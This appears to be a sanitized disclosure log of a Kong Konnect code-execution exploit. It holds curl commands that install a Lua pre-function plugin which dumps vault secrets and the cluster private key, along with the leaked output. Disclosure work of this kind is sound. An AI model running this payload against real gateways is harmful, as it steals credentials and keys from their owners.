# Kong Konnect RCE Exploitation — Full Execution Logs (Sanitized)

All sensitive identifiers (control plane ID, proxy hostnames, base64-encoded keys) have been replaced with placeholders.

## Log 1: List Existing Plugins

**Command:**

```bash
curl -s "https://eu.api.konghq.com/v2/control-planes/<REDACTED_CONTROL_PLANE_ID>/core-entities/plugins" \
  -H "Authorization: Bearer ${TOKEN}"
```

**Response:**

```json
{
  "data": [
    {
      "config": {
        "add": {
          "body": [],
          "headers": ["x-secret-val:{vault://env/supersecret}"],
          "querystring": []
        }
      },
      "created_at": 1764161948,
      "enabled": true,
      "id": "05624a12-320c-4eee-b1c7-b62213005fe2",
      "name": "request-transformer",
      "protocols": ["grpc", "grpcs", "http", "https"]
    }
  ],
  "next": null
}
```

---

## Log 2: Delete Existing pre-function Plugin

**Command:**

```bash
curl -s -X DELETE "https://eu.api.konghq.com/v2/control-planes/<REDACTED_CONTROL_PLANE_ID>/core-entities/plugins/b4a6cc92-18c5-4e3e-baf0-658715e84362" \
  -H "Authorization: Bearer ${TOKEN}"
```

**Response:**

```text
(empty - 204 No Content)
```

---

## Log 3: Create Malicious pre-function Plugin

**Command:**

```bash
curl -s -X POST "https://eu.api.konghq.com/v2/control-planes/<REDACTED_CONTROL_PLANE_ID>/core-entities/plugins" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "pre-function",
    "config": {
      "access": [
        "local out={\"FULL_SECRET_EXFIL\"}; local vars={\"AWS_ACCESS_KEY_ID\",\"AWS_SECRET_ACCESS_KEY\",\"AWS_SESSION_TOKEN\",\"KONG_LICENSE_DATA\",\"VAULT_TOKEN\",\"DATABASE_URL\",\"REDIS_URL\",\"KONG_CLUSTER_CERT\",\"KONG_CLUSTER_CERT_KEY\"}; for _,v in ipairs(vars) do local ok,val=pcall(kong.vault.get,\"{vault://env/\"..v..\"}\"); out[#out+1]=v..\"=\"..tostring(val):sub(1,500) end; kong.response.exit(200,table.concat(out,\"\\n\"))"
      ]
    },
    "enabled": true
  }'
```

**Response:**

```json
{
  "config": {
    "access": [
      "local out={\"FULL_SECRET_EXFIL\"}; local vars={\"AWS_ACCESS_KEY_ID\",\"AWS_SECRET_ACCESS_KEY\",\"AWS_SESSION_TOKEN\",\"KONG_LICENSE_DATA\",\"VAULT_TOKEN\",\"DATABASE_URL\",\"REDIS_URL\",\"KONG_CLUSTER_CERT\",\"KONG_CLUSTER_CERT_KEY\"}; for _,v in ipairs(vars) do local ok,val=pcall(kong.vault.get,\"{vault://env/\"..v..\"}\"); out[#out+1]=v..\"=\"..tostring(val):sub(1,500) end; kong.response.exit(200,table.concat(out,\"\\n\"))"
    ],
    "body_filter": [],
    "certificate": [],
    "functions": [],
    "header_filter": [],
    "log": [],
    "rewrite": [],
    "ws_client_frame": [],
    "ws_close": [],
    "ws_handshake": [],
    "ws_upstream_frame": []
  },
  "created_at": 1764168523,
  "enabled": true,
  "id": "a1b2c3d4-5e6f-7890-abcd-ef1234567890",
  "name": "pre-function",
  "protocols": ["grpc", "grpcs", "http", "https"],
  "updated_at": 1764168523
}
```

---

## Log 4: Trigger Exploitation — PRIVATE KEY LEAKED

**Command:**

```bash
curl -s "https://<REDACTED_PROXY>.kongcloud.dev/test"
```

**Response (CRITICAL — PRIVATE KEY EXFILTRATED, base64 redacted):**

```text
FULL_SECRET_EXFIL
AWS_ACCESS_KEY_ID=nil
AWS_SECRET_ACCESS_KEY=nil
AWS_SESSION_TOKEN=nil
KONG_LICENSE_DATA=nil
VAULT_TOKEN=nil
DATABASE_URL=nil
REDIS_URL=nil
KONG_CLUSTER_CERT=<BASE64_CERT_REDACTED>
KONG_CLUSTER_CERT_KEY=<BASE64_PRIVATE_KEY_REDACTED>
```

---

## Log 5: Decode Stolen Certificate (Sanitized)

**Command:**

```bash
echo "<BASE64_CERT_REDACTED>" | base64 -d
```

**Response:**

```text
-----BEGIN CERTIFICATE-----
[REDACTED CERT BODY]
-----END CERTIFICATE-----
```

**Certificate Details (non-sensitive summary):**

- **Subject:** CN=kongdp, C=US
- **Issuer:** CN=kongdp, C=US
- **Algorithm:** ECDSA P-256
- **Validity:** 10 years (approx.)

---

## Log 6: Decode Stolen Private Key — CRITICAL (Sanitized)

**Command:**

```bash
echo "<BASE64_PRIVATE_KEY_REDACTED>" | base64 -d
```

**Response:**

```text
-----BEGIN PRIVATE KEY-----
[REDACTED PRIVATE KEY BODY]
-----END PRIVATE KEY-----
```

**Private Key Details (non-sensitive summary):**

- **Algorithm:** ECDSA (Elliptic Curve)
- **Curve:** P-256 (secp256r1)
- **Key Size:** 256-bit
- **Format:** PKCS#8

---

## Log 7: Earlier Exploitation — System Info + Cluster Keys (Sanitized)

**Command:**

```bash
curl -s "https://<REDACTED_PROXY>.kongcloud.dev/test"
```

**Response (secrets redacted):**

```text
ENV_VAULT_EXFIL
PATH = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOME = /root
KONG_PREFIX = /usr/local/kong
KONG_DATABASE = off
KONG_PG_HOST = nil
KONG_PG_PASSWORD = nil
KONG_ADMIN_LISTEN = nil
KONG_CLUSTER_CERT = <BASE64_CERT_REDACTED>
KONG_CLUSTER_CERT_KEY = <BASE64_PRIVATE_KEY_REDACTED>
AWS_ACCESS_KEY_ID = nil
AWS_SECRET_ACCESS_KEY = nil
```

---

## Log 8: Save Stolen Keys to Files

**Command:**

```bash
mkdir -p stolen_keys
cat > stolen_keys/cluster.crt << 'EOF'
-----BEGIN CERTIFICATE-----
[REDACTED CERT BODY]
-----END CERTIFICATE-----
EOF

cat > stolen_keys/cluster.key << 'EOF'
-----BEGIN PRIVATE KEY-----
[REDACTED PRIVATE KEY BODY]
-----END PRIVATE KEY-----
EOF

ls -la stolen_keys/
```

**Response:**

```text
total 6
drwxrwx--- 1 root vboxsf    0 Nov  .
drwxrwx--- 1 root vboxsf 4096 Nov  ..
-rwxrwx--- 1 root vboxsf  613 Nov  cluster.crt
-rwxrwx--- 1 root vboxsf  241 Nov  cluster.key
```

---

## Log 9: Earlier Prometheus Metrics Dump

**Command:**

```bash
curl -s "https://<REDACTED_PROXY>.kongcloud.dev/test"
```

**Response:**

```text
INTERNAL_SERVICES_LEAKED
http_requests_total{service="aws-metadata",route="aws-route"}=1
http_requests_total{service="etcd-internal",route="etcd-route"}=4
http_requests_total{service="k8s-api",route="k8s-route"}=4
http_requests_total{service="localhost-admin-8001",route="admin-route"}=2
```

---

## Log 10: Kong Configuration Dump

**Command:**

```bash
curl -s "https://<REDACTED_PROXY>.kongcloud.dev/test"
```

**Response:**

```text
KONG_CONFIG_DUMP
CONF:kong_process_secrets=/usr/local/kong/.kong_process_secrets
CONF:keyring_vault_kube_api_token_file=/run/secrets/kubernetes.io/serviceaccount/token
CONF:lua_ssl_trusted_certificate_combined=/usr/local/kong/.ca_combined
CONF:cluster_cert=/usr/local/kong/ssl/cluster.crt
CONF:cluster_cert_key=******
CONF:admin_gui_ssl_cert=/usr/local/kong/ssl/admin-gui-kong-default.crt
CONF:admin_gui_ssl_cert_key=******
CONF:admin_ssl_cert=/usr/local/kong/ssl/admin-kong-default.crt
CONF:portal_api_ssl_cert=/usr/local/kong/ssl/portal-api-kong-default.crt
CONF:ssl_cert=/usr/local/kong/ssl/kong-default.crt
CONF:status_ssl_cert=/usr/local/kong/ssl/status-kong-default.crt
```

---

## Log 11: Shared Memory Dictionaries

**Command:**

```bash
curl -s "https://<REDACTED_PROXY>.kongcloud.dev/test"
```

**Response:**

```text
SHARED_DICTS_DUMP
kong_locks
kong_healthchecks
kong_cluster_events
kong_rate_limiting_counters
kong_core_db_cache
kong_db_cache
kong_secrets
kong_keyring
prometheus_metrics
kong_vaults_hcv
kong_debug_session
```

---

## Summary of Leaked Data (Sanitized)

| Data Type                 | Status | Value (Sanitized)                                 |
| ------------------------- | ------ | ------------------------------------------------- |
| **KONG_CLUSTER_CERT_KEY** | LEAKED | ECDSA P-256 Private Key (body redacted)           |
| **KONG_CLUSTER_CERT**     | LEAKED | Full Certificate (body redacted)                  |
| **HOME**                  | LEAKED | `/root` (running as root)                         |
| **KONG_PREFIX**           | LEAKED | `/usr/local/kong`                                 |
| **KONG_DATABASE**         | LEAKED | `off` (DB-less mode)                              |
| **PATH**                  | LEAKED | Full system path                                  |
| **Internal Services**     | LEAKED | aws-metadata, etcd, k8s-api, localhost-admin-8001 |
| **Config Paths**          | LEAKED | K8s token path, cert paths                        |
| **Shared Dicts**          | LEAKED | kong_secrets, kong_keyring, etc.                  |

---

## Conclusion

**Severity:** CRITICAL (CVSS 9.8)

The exploitation successfully demonstrated:

1.  **Arbitrary Lua Code Execution** via pre-function plugin
2.  **Sandbox Bypass** — `kong.vault.get()` unrestricted
3.  **Private Key Exfiltration** — cluster key fully leaked (body redacted here)
4.  **System Information Disclosure** — paths, services, configs
5.  **Keys Saved to Files** — ready for rogue DP attack (in theory)

All sensitive values (actual certificate, private key, concrete IDs and hostnames) are **redacted** in this log file to make it safe as an attachment.
